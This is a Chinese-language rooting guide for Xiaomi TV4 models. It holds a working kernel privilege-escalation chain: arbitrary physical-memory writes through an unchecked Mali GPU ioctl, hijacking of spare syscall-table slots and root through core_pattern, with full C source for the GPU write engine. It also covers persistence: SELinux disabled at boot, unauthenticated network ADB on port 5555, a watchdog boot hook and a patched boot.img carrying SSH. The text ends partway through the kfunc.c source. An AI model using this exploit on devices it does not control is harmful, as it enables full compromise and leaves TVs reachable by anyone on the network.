# 小米电视4 ROOT 与 ADB 永久开启

适用小米电视4 系列 55 英寸（销售型号 L55M5-EC，系统里显示的产线代号是 MiTV4-ANSM0，device 名叫 `xmen`）。整套流程做完之后的效果：

- `su -c id` 直接拿到 `uid=0(root)`
- SELinux 永久 Permissive，重启不反弹
- adb 的网络通道永久开，所有电脑连接不需要配对确认
- recovery 是打过补丁的 TWRP，进出 recovery 不会破坏上述任何状态
- 以上全部在重启后自动生效，日常使用不需要重复任何操作

分三部分看：第一部分是拿 root 的利用链（纯内存态，重启就没了，但它负责把持久化改造装进去）；第二部分是持久化改造（env 分区、build.prop、开机钩子、补丁版 TWRP，改完落盘，重启不丢）；第三部分是完全体镜像（内核四补丁 + 迷你系统装配，把前两层的核心改动焊死在 boot 分区里，见操作步骤第 7、8 节）。

## 适配范围

先把丑话说在前面：这个方法高度依赖固件里的三样东西——Amlogic 魔改的 Mali GPU 驱动（物理地址校验被删掉了）、arm64 内核的 syscall 空槽、core_pattern 的提权通道。只要这三样都在，方法就成立；固件版本不同只会导致地址不一样，地址能算出来就能用。

### 已实测通过的机型与固件

| 销售型号（设置页显示） | 型号码（机身标签 / About） | 产线代号（ro.product.model） | 机芯 | SoC / GPU | 固件 build | 内核构建日期 | 验证程度 |
|---|---|---|---|---|---|---|---|
| 小米全面屏电视 E55C | L55M5-EC | MiTV4-ANSM0 | T75T | S905L2 / Mali-400 Utgard r6p1 | 3396（2022-12-20 构建） | 2022-12-20 | **全流程通过**：root、SELinux 源头禁用、ADB 持久化、反复重启验收 |
| 小米电视4C 50 英寸 | L50M5-AD | MiTV4-ANSM0 | 同产线 | S905L2 / Mali-400 Utgard r6p1 | 2897（2021-11-13 构建） | 2021-11-13 | 提权链（GPU 写 → syscall 空槽 → root）已验证；持久化部分未在该机执行 |

两个尺寸共用同一个产线代号 MiTV4-ANSM0 和同一套驱动体系，这不是巧合——这套方案的核心依赖（GPU 驱动、内核、syscall 表布局）是按产线固件走的，产线代号相同就代表骨架相同，差异只在地址。

另外核对过官方降级包（build 3390，2022-11-28 构建）的内核：3390 和 3396 的内核代码段逐符号完全一致，只有数据段整体漂移 0x4000。所以 **build 3390 到 3396 之间，本文档里 `KLN_ADDR` 直接可用，`SLOT_PHYS` 等数据段地址按第 6 节重算一遍**。

### 固件版本适配表

| 固件 build | 构建日期 | 内核地址 | 适配结论 |
|---|---|---|---|
| 3396 | 2022-12-20 | 本文全部地址直接可用 | 实测通过 |
| 3390 | 2022-11-28 | `KLN_ADDR` 可用，`SLOT_PHYS` 重算 | 内核实测一致 |
| 3386 及更早（2061 / 2897 等） | 2020-03 ~ 2021-11 | 全部地址重算 | 技术条件需按下方清单逐项核对 |
| 3396 之后（如有） | — | 全部地址重算 | 以判定清单为准 |

这台设备的固件线在 2022 年 12 月（3396）之后就没有官方更新了，3396 就是最终版本。

### 生产年代

| 项目 | 时间范围 |
|---|---|
| 硬件生产销售 | 约 **2019 年至 2021 年**（面板驱动参数 dated 2019-05，固件最终版 2022-12） |
| 官方固件更新窗口 | 约 2020 年 3 月（build 2061）至 2022 年 12 月（build 3396） |
| 内核安全补丁停止时间 | **2017 年 4 月 1 日**（此后所有内核漏洞在这批设备上全部未修） |

一句话总结适配范围：**2019 到 2021 年间生产的 L55M5-EC 与同产线机型，运行 2020 年之后到 2022 年 12 月为止的任意官方固件，都可以尝试本方案；其中 build 3390~3396 有实测地址可用，更早的版本先按下方清单核对再算地址。**

### 普通用户自查流程（三步）

小米电视的型号体系比较乱（同一家电视在系统里、包装盒上、设置页里可能是三个名字），按下面三步走不会认错：

**第一步：在设置页找到销售型号。**
遥控器进「设置 → 关于本机」（部分固件在「设置 → 设备偏好 → 关于」），看「型号名称」和「型号码」两个字段。如果你的机器是本方案覆盖范围，应该看到类似：

- 型号名称：小米全面屏电视 E55C（或小米电视4C 50 英寸）
- 型号码：L55M5-EC（或 L50M5-AD）

**第二步：连 adb 确认产线代号。**

```bash
adb shell getprop ro.product.model          # 期望: MiTV4-ANSM0
adb shell getprop ro.product.device         # 期望: xmen
```

**第三步：确认 GPU 驱动是 Utgard。**

```bash
adb shell cat /sys/module/mali/version      # 期望: r6p1-01rel0
adb shell ls -l /dev/mali                   # 期望: crw-rw-rw-
```

`/dev/mali` 是 0666 意味着 GPU 入口对所有进程开放——不限于 adb shell，装在本机的普通应用同样能走这条路。

### 型号不在列表里怎么办

上表的机型列表不是封闭的。这个方法对设备的真实要求只有下面几条，你的电视哪怕型号完全陌生，只要逐项核对全部通过，就值得试：

| 检查项 | 命令 | 需要的值 |
|---|---|---|
| 设备代号 | `adb shell getprop ro.product.device` | `xmen`（其他值需重算地址并自担风险） |
| 内核 | `adb shell cat /proc/version` | `Linux version 3.14.29` 且 aarch64 编译 |
| 用户态 | `adb shell getprop ro.product.cpu.abi` | `armeabi-v7a` |
| GPU 驱动版本 | `adb shell cat /sys/module/mali/version` | `r6p1-01rel0`（Utgard 系驱动均可尝试） |
| Mali 设备权限 | `adb shell ls -l /dev/mali` | `crw-rw-rw-` |
| 内核补丁级别 | `adb shell getprop ro.build.version.security_patch` | 2017-04-01 或更早 |
| 系统分区无 dm-verity | `adb shell ls /dev/block/dm-*` | 不存在 |

全部满足后按第 6 节重算地址，三道校验通过再上机。

### 理论上可能适配的机型（未实测，仅供参考）

下面这些机型没有实测数据，但从硬件平台看**有可能**满足本方案的技术条件。再强调一遍：**只是理论上可能**。是否真的适配取决于该批次固件里 Mali 驱动的校验逻辑是否同样被删、内核是否 3.14.29 arm64、syscall 表布局是否有空槽——任何一项不满足都不行，而且所有内核地址都必须按第 6 节重算，绝不能直接套用本文给出的数值。

| 系列 | 可能涉及的型号 | 推测依据 | 主要疑点 |
|---|---|---|---|
| 小米电视4 | 49 英寸（L49M5-AA）、55 英寸（L55M5-AA）、65 英寸（L65M5-AA） | 与 E55C 同属 4 系产品线，部分批次为 Amlogic 方案 | 早期批次 GPU 可能是 Mali-T820 或 Mali-450，架构不同则不适用 |
| 小米电视4A | 43 / 50 / 55 / 65 英寸的部分批次 | 部分批次搭载 Amlogic Cortex-A53 平台 + Mali-450 Utgard | 4A 存在 Amlogic 与 MStar 混批次，必须先确认 SoC |
| 小米电视4X | 43 / 50 / 55 / 65 英寸的部分批次 | 同上 | 同上，且部分批次内核可能不是 3.14 |
| 小米全面屏电视 | E40A（L40M5-A）、E55A、E65A 等非 E55C 尺寸 | 与 E55C 同为全面屏系列，部分批次同为 Amlogic 方案 | 机芯编号不同（如 E40A 为 T66K），驱动版本需逐台确认 |
| Redmi 智能电视 | X55 / X65 的部分批次 | 部分批次沿用同代 Amlogic 平台 | 部分批次为 S905L3（Mali-G31 Bifrost），**确定不适用** |

判定标准依旧是那几条：`ro.product.device` 之类的产线标识、内核版本 3.14.29 aarch64、GPU 是 Utgard 架构（`/sys/module/mali` 存在且版本为 r5p1/r6p1/r7p0/r10p0 系）、`/dev/mali` 0666、安全补丁级别不高于 2017-04-01。四样全中就按第 6 节重算地址，缺一样就放下。

### 确定不适用的设备

- **小米电视 4A / 4S / 5 / Redmi 电视中搭载 Mali-G31（Bifrost 架构）的批次**（对应 SoC 如 S905X3、S905L3）——GPU 驱动完全不同，本方案的 GPU 写引擎不适用；
- **MTK / MStar 机芯的小米电视**（部分 32 英寸小尺寸型号）——不是 Amlogic 平台；
- **arm32 内核编译的旧款**——syscall 空槽手法依赖 64 位内核；
- **启用了 dm-verity / AVB 的固件**——本机实测未启用（`/dev/block` 下没有 dm 设备，cmdline 没有 verity 参数），但如果你的固件有，改 build.prop 重启会失败。

## 原理

### GPU 任意物理内存写

小米给这批电视的 Mali Utgard 驱动（r6p1）里，物理地址校验函数 `mali_mem_validation_check` 被预处理器裁掉了校验逻辑，直接返回成功。后果是：任何能打开 `/dev/mali` 的进程（这台机器上这个设备节点是 0666，所有用户都能开）都可以用一个 ioctl 把任意物理地址绑进 GPU 的页目录：

```
ioctl(/dev/mali, MALI_IOC_MEM_BIND, {
    vaddr     = <GPU 虚拟地址>
    size      = 0x1000
    flags     = 1<<11        // EXTERNAL_MEMORY 后端
    phys_addr = <随便什么物理地址>
})
```

绑好之后，再提交一份手工构造的 PP 渲染任务。Mali 的像素处理器在渲染结束时会做一次 write-back，把一个常量颜色写进帧缓冲——我们控制帧缓冲的地址和颜色格式，它就变成了一个受控的内存写入器。实测下来格式选 0x06 的时候，单次渲染恰好向目标地址写入 128 个字节：同一个 8 字节值重复 16 遍。128 字节正好覆盖后面要用的 16 个 syscall 表项，不多不少。

这套写引擎在提交真实写入之前会先在自家的 ion 内存页上做一次自测：请求往偏移 0x800 写，读回来确认恰好是 0x800 起始、恰好 128 字节被改写。自测不过就退出，不碰目标地址。这个设计是必须的，因为 GPU 写的落点如果不精确，写内核数据就是赌博。

有一个实际踩过的坑值得记录：驱动对同一个 GPU 虚拟地址的重复绑定会进入一个 300 毫秒一次的无限重试，进程直接卡死在内核态，只能重启设备。所以每次绑定都用递增的地址，绝不复用。

### 劫持系统调用表

arm64 内核的 `sys_call_table` 是 8 字节表项的函数指针数组，放在 `.data` 段。这个固件的表里第 244 到 259 项全部指向 `sys_ni_syscall`——十六个连续的未实现桩，正常的系统调用号永远不会落到这里。它们的存在状态是安全的：没有任何调用者。

一次 GPU 写把这十六个槽全部填成同一个内核函数地址。因为 arm64 的系统调用约定把参数放在 x0 到 x5、返回值放 x0，用户态执行 `syscall(244, a, b, c)` 就等于调用那个函数，参数原样传进去，返回值原样拿回来。

用法分三步：

第一，把 `kallsyms_lookup_name` 的地址填进去。之后 `syscall(244, "memcpy")` 返回内核里 memcpy 的真实地址。这一步的妙处在于整条利用链只需要这一个写死的地址，后面所有符号都靠内核自己解析，固件小版本差异不会导致链条失效。

第二，把槽位换成 memcpy。现在 `syscall(244, dst, src, n)` 就是内核内存的任意读写：目的地是用户缓冲区就是读，源是用户缓冲区就是写。

第三（备选），槽位也可以指向 `prepare_kernel_cred` 和 `commit_creds`，直接给当前进程换 root 凭据。这条路验证过可行，但要注意 `exit_creds` 会把 cred 引用计数清掉，cred 指针不能跨进程复用。

缓存一致性问题需要单独说。GPU 的 DMA 写对「冷」数据立竿见影——syscall 表、core_pattern 这些不常被 CPU 碰的变量，写完读回来就是新值。但对「热」变量无效：`selinux_enforcing` 每次权限检查都被 CPU 读，它常驻一级缓存，GPU 改的是内存里的值，CPU 读的是缓存里的旧值，改了等于没改。所以关 SELinux 这一步必须走 CPU 侧的写——用劫持后的 memcpy 来做，GPU 只负责先把槽位铺好。

### 关 SELinux，然后借 core_pattern 拿 root

SELinux 置零之后，内核还有一个现成的 root 执行器可以用：core dump 管道。把 `core_pattern` 改成 `|/data/local/tmp/roothelper.sh`，然后让一个设置了 RLIMIT_CORE 的进程崩掉，内核会以 uid=0、context=u:r:kernel:s0 的身份去执行那个脚本。这条通道没有 LSM 前置检查，也不依赖 SELinux 状态。

roothelper 以内核身份运行时 capability 是全量的，比 setuid 的 su 能干的事情多——remount 系统分区、写 root 属性、给二进制挂 file capabilities，这些 su（euid 0 但 capability 集为空）做不了的事都在这一步做完。

### 持久化之一：从 env 分区关掉 SELinux

内存态的 SELinux 状态重启就复位。想让它开机就是宽容模式，得从启动源头改：内核 cmdline 里的 `androidboot.selinux=enforcing` 参数决定 init 加载策略后是 enforce 还是 permissive，而 cmdline 由 U-Boot 从环境变量拼出来，环境变量存在 eMMC 的 `env` 分区。

env 分区是标准 U-Boot 格式：开头 4 字节是整个数据区的 CRC32，后面是 NUL 分隔的 key=value 列表，尾部用 0 填充到固定大小（这台机器是 0x10000）。CRC 的覆盖长度没法直接查（编译期定值），但有个简单的办法：拿现有分区的前 4 字节做基准，用 0x1000、0x2000、0x4000… 依次试算 CRC，哪个长度算出来等于存储值，哪个就是真实的 ENV_SIZE。这台机器算出来是 0x10000。

把 `initargs` 变量里的 `androidboot.selinux=enforcing` 改成 `permissive`，长度多一个字节，NUL 分隔的格式完全无所谓，重算 CRC 写回去，重启之后 init 直接以宽容模式启动。这事一旦做成就永久了——env 是掉电保存的。

顺带一提，env 里有一条官方刷机流程用的变量，里面写着 `editbootargs androidboot.selinux permissive`——小米自己的刷机模式也是宽容启动。我们只是把这个机制搬到了正常启动路径。

### 持久化之二：ADB 通道

这台电视的 adb 有两道锁。第一道在 build.prop 里：`ro.adb.secure=1` 意味着每个新主机连接都要走 RSA 配对，屏幕上弹确认框。改成 0 之后 adbd 直接不做认证握手，谁连都放。

第二道是设置页里那个「ADB调试」开关，它控制开机后有没有人给 adbd 设置 TCP 端口。默认是拒绝——开机流程里没有任何组件去设置 `service.adb.tcp.port`，adbd 只在 USB 上监听，网络连不上。它不是有个服务在开机时主动关 adb，而是没人开。

所以持久化做三件事：build.prop 里 `ro.adb.secure=1` 改 `0`；写入持久属性 `persist.adb.tcp.port=5555`（存 /data/property，adbd 启动时读）；最后解决「开机没人开 adb」的问题。

第三件事有个讲究。这台机器的 init 是裁剪过的，不解析 `/system/etc/init/*.rc` 目录，标准的 rc 持久化在这里行不通。但 init 原生有一个 `flash_recovery` 服务，每次开机执行 `/system/bin/install-recovery.sh`——这个脚本原本的作用是检查 recovery 分区是否需要重刷。最终方案是把整个脚本接管：原版的 applypatch 检查/还原逻辑整体移除（换 TWRP 后这段逻辑反而会闯祸），换成常驻巡查循环——脚本进程自己不退出，每 20 秒检查 ADB 三处状态，被关就在 20 秒内拉回。

为什么必须常驻而不是开机跑一次：实测过「后台子 shell 睡 30 秒再干活」的写法，flash_recovery 服务主进程 0.2 秒就退出，init 清理进程组时把后台子 shell 连带杀掉，动作从未执行（dmesg 里 exited with status 0 配合钩子日志无记录实锤）。常驻循环避开了这个坑。

这样两道锁在开机后都会被自动解开：build.prop 关掉了配对要求，巡查循环把通道拉起来并看住它。重启验收的结果是 adb connect 直接连上，什么按钮都不用按。

### 持久化之三：boot.img 完全体（内核补丁 + 迷你系统装配）

前面两层持久化（env 分区、系统分区钩子）有一个共同的软肋：它们都住在「系统外面」。env 里的
参数理论上还能被改回去，/system 里的文件也能被恢复出厂洗掉。把改动直接焊进 boot.img——内核
二进制本体加它随身携带的迷你启动系统（ramdisk）——才是字面意义的「焊死」。这一层能成立，依赖
三个先行结论：

**一、引导链不校验 boot.img 的内容。** 内核启动走 `imgread kernel boot 分区 → booti`，`booti_start`
全流程只查镜像头魔数，没有任何签名/哈希校验；唯一一个镜像加密分支由 efuse 熔丝位（AO_SEC_SD_CFG10
bit4）在出厂时决定，本机该位为 0（第三方 recovery 能正常引导即是实证）。所以改过的 boot.img 会
被原样引导。注意与 bootloader 分区自身的 AES-CBC 出厂打包加密区分开——那个改不了，这个随便改。

**二、init 服务天生是 root。** 从迷你系统里注册的 service 由 init（pid 1）以 root + 全量
capability 直接拉起，不需要任何提权。这个特性决定了设计取向：自愈、SSH、文件服务器这些
"要在开机早期就存在"的东西放进迷你系统最干净；而体积大的二进制不放——见下一条。

**三、迷你系统有硬体积上限。** ramdisk 在 boot.img 头部声明加载地址 0x01000000，与内核加载区
只有 512KB 间隔，引导阶段还要把它解压到内存。实测红线：gzip 后 **2.4MB 以内安全**（原版
2.23MB，验证过 2.34MB），4MB 直接引导死循环（无日志、无 panic，看门狗重启）。这决定了架构
取向——**迷你系统只携带脚本与密钥（约 8KB），所有二进制放 /data 持久分区**，由脚本在运行期
引用。/data 掉电保存，恢复出厂才需要重推一次。

内核侧打四个补丁（偏移以本机内核 Image 为准，符号表可精确定位）：

| 补丁 | 位置（Image 偏移） | 内容 | 效果 |
|---|---|---|---|
| P1 | 0xe4525d | `enforcing=` → `enforcinG=` | 内核参数表里"设防"参数名失效，cmdline 路径的设防通道关闭 |
| P2 | 0x30909c | `sel_write_enforce` 前 8 字节 → `mov x0,x2; ret` | 运行时 setenforce 写入被短路：调用返回成功但状态不变，内核永远不设防。这是比改参数深一层的手法——任何组件、任何时机调用都无效 |
| P3 | banner 尾 8 字节 | `CST 2022` → `XMENOK01` | 开机日志第一行的身份标记（/proc/version 是另一个字符串，见 4.4） |
| P4 | init_uts_ns.version 尾 | 追加 ` XMENOK01` | /proc/version 与 uname -v 的身份标记 |

迷你系统侧注入四样东西（全部是文本，总共约 8KB）：

1. `default.prop` 追加三条属性：`ro.adb.secure=0`、`ro.debuggable=1`、`service.adb.tcp.port=5555`；
2. `init.rc` 注册四个服务：heal（自愈，oneshot）、adbwatch（ADB 巡查）、dropbear（SSH）、
   httpd（文件服务器）——后两者指向 /data 上的二进制；
3. `/heal/` 目录：heal.sh、adbwatch.sh、install-recovery 接管版副本、主机钥匙、authorized_keys、
   passwd、profile；
4. 服务引用的二进制按清单放在 /data/local/tmp（见操作步骤第 8 节）。

这样成品的容灾结构是三道互为备份的锁：内核本体焊死不设防；迷你系统开机就重建 SSH/ADB/自愈；
系统分区的钩子和 su 是第三道。坏掉任何一道，另外两道照常工作。

### 持久化之四：U 盘引导通道（recovery_from_udisk，救砖保险绳）

上面四层改动全部依赖「系统能启动到某个阶段」。如果 boot 分区坏了、system 被改到
init 早期死锁，这些通道全部失效。最后一条通道在 U-Boot 里，独立于安卓的一切——
它写在 env 分区的 `recovery_from_udisk` 变量里（本机 env 实测原文）：

```
recovery_from_udisk=if fatload usb 0 ${loadaddr} aml_autoscript; then autoscr ${loadaddr}; fi;
if fatload usb 0 ${loadaddr} xmen.recovery; then if fatload usb 0 ${dtb_mem_addr} dtb.img; then
echo udisk dtb.img loaded; fi; bootm ${loadaddr}; fi;
（后面还有 usb 0:4 分区的同款重试）
```

U-Boot 收到 update 流程请求时先 `usb start` 初始化 USB，再到 U 盘根目录依次找
`aml_autoscript`（脚本镜像）与 `xmen.recovery`（recovery 镜像），找到 `xmen.recovery`
就直接 `bootm` 引导。**这条链不读任何 eMMC 分区、不依赖安卓、不依赖 root**，固件层执行。

触发方式（按可用性排序）:

1. 系统还能用（root 与否均可）: `adb shell reboot update`——shell 用户身份即可执行，无需 root（已实测）
2. ADB 不通: 冷启动【确定键+返回键同时按住】再通电——U-Boot 的 `irdetect` 检测到红外信号即转入 update 流程（env `switch_bootmode` cold_boot 分支，实测有效）
3. 特定红外码按住 2.5 秒（env `irremote_update` 变量）
4. `upgrade_step==3` 时每次开机自动进入

U 盘要求: FAT32 单分区、根目录平铺、一次只插一个盘（`fatload usb 0` 只枚举第一个设备）。

`xmen.recovery` 的内容就是把 TWRP 镜像改名——U 盘插上电视，TWRP 就能从 U 盘引导，
recovery 分区坏了都不影响。这是比安装 TWRP 更彻底的救援通道：引导介质本身可以随身带走。
`recovery.img` / `twrp.img` 是同镜像的备用名，覆盖不同固件版本的识别差异。

注意: `aml_autoscript` 路径（U-Boot 脚本自动执行）在本系列固件上**不生效**——这套
U-Boot 没有编译 `source` / `autoscr` 命令（`CONFIG_CMD_SOURCE` 未定义），env 里的
autoscr 调用是老版本残留的死代码。U 盘自动化在 U-Boot 层做不到，自动化由 TWRP 的
OpenRecoveryScript 承担（见操作步骤第 12 节）。`build_autoscript.py` 仍收录在源码章节，
适用于其他保留该命令的 Amlogic 固件。

## 准备

宿主机需要：

- Python 3（算地址、改 env 分区）
- zig 交叉编译器（0.11.x），编译四个 ARM 静态二进制；用 Android NDK 的 clang 也行，参数换一下
- adb，电视已经能连：`adb connect <电视IP>:5555` 通，且 `adb shell getprop ro.product.device` 返回 `xmen`

电视端第一次操作需要在设置页把「ADB调试」开成允许。做完后面的持久化之后这个开关就不需要再管了。

目录建议这样摆：

```
work/
├── bin/        # 编译产物
├── scripts/    # 脚本
├── fw/         # 官方固件包（update-xmen.zip）和提取产物
└── backup/     # 所有回滚备份
```

## 源码

### gpu_arb_write.c（32 位，GPU 写引擎）

```c
/*
 * gpu_arb_write - 通过 Mali-400 (Utgard) write-back 单元向任意物理地址
 *                 写入 128 字节「8 字节值重复 16 次」。
 *
 * 用法: gpu_arb_write <物理地址hex> <8字节值hex64>
 * 目标地址须保证 128 字节不跨 4KB 页边界。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define ION_IOC_ALLOC 0xc0144900u
#define ION_IOC_SHARE 0xc0084904u
#define ION_IOC_CUSTOM 0xc0084906u

#define MALI_IOC_MEM_BIND 0xc0288302u
#define MALI_IOC_PP_START_JOB 0xc1988400u
#define MALI_IOC_WAIT_NOTIF 0xc0688202u

#define CMD_VA 0x20000000u
#define EXT_VA 0x40000000u
#define ION_HEAP_SYSTEM 1u
#define ION_HEAP_CARVEOUT (1u << 2)

/* Mali 内存绑定后端标志 */
#define BIND_DMA_BUF (1u << 9)
#define BIND_EXTERNAL (1u << 11)

#define PIXFMT_WB_128 0x06 /* 128 字节：8 字节值重复 16 次 */

struct ion_alloc { uint32_t len, align, heap_mask, flags, handle; };
struct ion_fd    { uint32_t handle; int32_t fd; };
struct ion_custom{ uint32_t cmd, arg; };
struct ion_phys  { int32_t fd; uint32_t addr, size; };
struct mali_bind {
    uint64_t ctx;
    uint32_t vaddr, size, flags, padding;
    uint32_t phys_addr, rights, ext_flags, pad2;
};

static void put32(void *b, unsigned off, uint32_t v)
{ *(uint32_t *)((char *)b + off) = v; }
static void put64(void *b, unsigned off, uint64_t v)
{ *(uint64_t *)((char *)b + off) = v; }

static int mali_fd = -1;
static int ion_fd = -1;
static void *cmd_buf = NULL;

static void build_shader(void)
{
    uint32_t *c = (uint32_t *)cmd_buf;
    memset(cmd_buf, 0, 0x4000);
    c[0] = 0;
    c[1] = 0xB8000000u;
    c[2] = 0xE0000002u | (((CMD_VA + 0x3000u) >> 3) & ~0xE0000003u);
    c[3] = 0xB0000000u;
    c[4] = 0;
    c[5] = 0xBC000000u;
    c[6] = 0;
    c[7] = 0;
}

/* 反转驱动对两个常量寄存器施加的字节序置换，使 val 以自身小端字节落盘 */
static void encode_value(uint64_t val, uint32_t *c0, uint32_t *c1)
{
    unsigned char b[8];
    memcpy(b, &val, 8);
    *c0 = (uint32_t)b[4] | ((uint32_t)b[5] << 8) | ((uint32_t)b[2] << 16) |
          ((uint32_t)b[3] << 24);
    *c1 = (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[6] << 16) |
          ((uint32_t)b[7] << 24);
}

static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
                       uint32_t word0)
{
    struct mali_bind b;
    memset(&b, 0, sizeof b);
    b.vaddr = vaddr;
    b.size = size;
    b.flags = flags;
    b.phys_addr = word0;
    return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
}

/* 单次 write-back 突发：向物理地址 phys 写 128 字节 val */
static int gpu_write128(uint32_t phys, uint64_t val)
{
    uint32_t c0, c1;
    encode_value(val, &c0, &c1);

    /* 每次绑定使用递增的 GPU 虚拟地址：驱动对重复 vaddr 会无限重试挂死 */
    static int bind_seq = 0;
    uint32_t ext_va = EXT_VA + (0x1000u * (uint32_t)bind_seq++);

    if (bind_region(ext_va, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0)
        return -1;

    static volatile uint32_t done;
    uint8_t job[408];
    memset(job, 0, sizeof job);
    done = 0;

    put64(job, 8, 0x7777);
    put32(job, 20, CMD_VA);
    put32(job, 24, CMD_VA + 0x1000);
    put32(job, 32, 0x02);
    put32(job, 44, c0);
    put32(job, 48, c1);
    put32(job, 52, c0);
    put32(job, 56, c1);
    put32(job, 68, CMD_VA + 0x2000);
    put32(job, 72, (0x400u << 16) | 0x400u);
    put32(job, 84, 1);
    put32(job, 88, 1);
    put32(job, 92, 0x77);
    put32(job, 96, 1);
    put32(job, 104, 0xE0C);
    put32(job, 108, 0x8888);
    /* --- 写目标描述符 --- */
    put32(job, 168, 0x02);                        /* 类型: write-back */
    put32(job, 172, ext_va + (phys & 0xfffu));    /* 目标地址 */
    put32(job, 176, PIXFMT_WB_128);               /* 本笔宽度 */
    put32(job, 188, 0);
    put32(job, 200, 0);
    put32(job, 328, 1);
    put32(job, 352, 0);
    put32(job, 396, (uint32_t)-1);
    put64(job, 400, (uint64_t)(uintptr_t)&done);

    if (ioctl(mali_fd, MALI_IOC_PP_START_JOB, job) < 0)
        return -1;

    uint8_t notif[104];
    memset(notif, 0, sizeof notif);
    alarm(5);
    int r = ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif);
    alarm(0);
    if (r < 0)
        return -1;

    /* 等待写入落盘后再让调用方读目标 */
    size_t n = 8u << 20;
    volatile char *p = malloc(n);
    if (p) {
        for (size_t i = 0; i < n; i += 64) p[i] = (char)(i * 7);
        free((void *)p);
    }
    usleep(40000);
    return 0;
}

/* 自校准：证明对自有 ion 页请求地址 X 产生恰好在 X 起始的 128 字节 */
static int calibrate(void)
{
    struct ion_alloc a;
    memset(&a, 0, sizeof a);
    a.len = 0x1000;
    a.align = 0x1000;
    a.heap_mask = ION_HEAP_CARVEOUT;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) {
        perror("ion carveout alloc");
        return -1;
    }
    struct ion_fd f;
    f.handle = a.handle;
    f.fd = -1;
    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) {
        perror("ion share");
        return -1;
    }
    uint8_t *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, f.fd, 0);
    if (pg == MAP_FAILED) {
        perror("mmap carveout");
        return -1;
    }
    struct ion_phys ip;
    memset(&ip, 0, sizeof ip);
    ip.fd = f.fd;
    struct ion_custom cu;
    cu.cmd = 8; /* 自定义命令 8 = 查询物理地址 */
    cu.arg = (uint32_t)(uintptr_t)&ip;
    if (ioctl(ion_fd, ION_IOC_CUSTOM, &cu) < 0) {
        perror("ion phys");
        return -1;
    }

    const uint32_t off = 0x800;
    const uint64_t val = 0xa1b2c3d4e5f60718ULL;
    memset(pg, 0xa5, 0x1000);
    if (gpu_write128(ip.addr + off, val) < 0) {
        printf("[!] calibration write failed\n");
        return -1;
    }

    int first = -1, last = -1, changed = 0;
    for (uint32_t i = 0; i < 0x1000; i++) {
        if (pg[i] != 0xa5) {
            if (first < 0) first = (int)i;
            last = (int)i;
            changed++;
        }
    }
    int ok = (first == (int)off) && (changed == 128);
    for (int i = 0; i < 16 && ok; i++)
        if (pg[off + i] != ((uint8_t *)&val)[i & 7]) ok = 0;

    printf("[*] calibration: request 0x%03x -> changed [0x%03x..0x%03x], %d bytes  %s\n",
           off, first, last, changed, ok ? "OK" : "FAILED");
    munmap(pg, 0x1000);
    return ok ? 0 : -1;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 3) {
        fprintf(stderr, "usage: %s <phys_hex> <value_hex64>\n", argv[0]);
        return 1;
    }
    uint32_t phys = (uint32_t)strtoul(argv[1], NULL, 16);
    uint64_t val = strtoull(argv[2], NULL, 16);

    mali_fd = open("/dev/mali", O_RDWR);
    ion_fd = open("/dev/ion", O_RDWR);
    if (mali_fd < 0 || ion_fd < 0) {
        perror("open /dev/mali or /dev/ion");
        return 1;
    }

    /* 命令缓冲: ion system heap, 映射到 GPU 的 CMD_VA */
    struct ion_alloc a;
    memset(&a, 0, sizeof a);
    a.len = 0x4000;
    a.align = 0x1000;
    a.heap_mask = ION_HEAP_SYSTEM;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) {
        perror("ion cmd alloc");
        return 1;
    }
    struct ion_fd f;
    f.handle = a.handle;
    f.fd = -1;
    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) {
        perror("ion cmd share");
        return 1;
    }
    cmd_buf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, f.fd, 0);
    if (cmd_buf == MAP_FAILED) {
        perror("mmap cmd");
        return 1;
    }
    /* DMA_BUF 后端必须携带对应标志位，flags=0 会落入无效分支返回 EFAULT */
    if (bind_region(CMD_VA, 0x4000, BIND_DMA_BUF, (uint32_t)f.fd) < 0) {
        perror("bind cmd buffer");
        return 1;
    }
    build_shader();

    if (calibrate() < 0) {
        printf("[!] aborting without touching the requested address\n");
        return 2;
    }
    if (phys & 0xfff) {
        /* 页内偏移受支持（write-back 目标 = EXT_VA + 页内偏移），
         * 仅拒绝 128 字节跨页的情形 */
        if (((phys & 0xfff) + 0x80) > 0x1000) {
            fprintf(stderr, "[!] 128 bytes would cross page boundary\n");
            return 1;
        }
    }

    printf("[*] writing 128 bytes of 0x%016llx at phys 0x%08x\n",
           (unsigned long long)val, phys);
    if (gpu_write128(phys, val) < 0) {
        perror("gpu write");
        return 1;
    }
    printf("[*] done\n");
    return 0;
}
```

### kfunc.c（64 位，空槽调用器）
这个工具在 exploit 链里负责「调用任意内核函数」。除了基本模式外，它还带两个基于
`probe_kernel_read`（对源/目标两侧缺页都有异常表保护，读非法地址只返回失败不 panic）的诊断模式，
内核读原语落地后做内存扫描与取证全靠它们：

```c
/*
 * kfunc - call an arbitrary kernel function from a 64-bit process by abusing
 *         unused entries of sys_call_table.
 *
 * Background
 * ----------
 * The kernel on the target is arm64, so sys_call_table[] holds 8-byte
 * pointers.  Entries [244..259] are all sys_ni_syscall ("not implemented"),
 * i.e. 16 consecutive slots nobody calls.  One 128-byte write from
 * gpu_arb_write() fills all 16 of them with the same address, and the kernel
 * then happily dispatches our syscall number into that function.
 *
 * Because the syscall ABI passes arguments in x0..x5 and returns x0, the
 * called function sees our arguments and we get its return value back.  There
 * is no PAN on this target, so the kernel can also read strings and buffers
 * that live in our address space.
 *
 * Note: a *32-bit* process does NOT go through this table - it goes through
 * compat_sys_call_table, which lives in .text.  That is why this helper must
 * be a 64-bit (aarch64) binary.
 *
 * Build (64-bit ARM, static):
 *   aarch64-linux-musl-gcc -O1 -static -o kfunc kfunc.c
 *
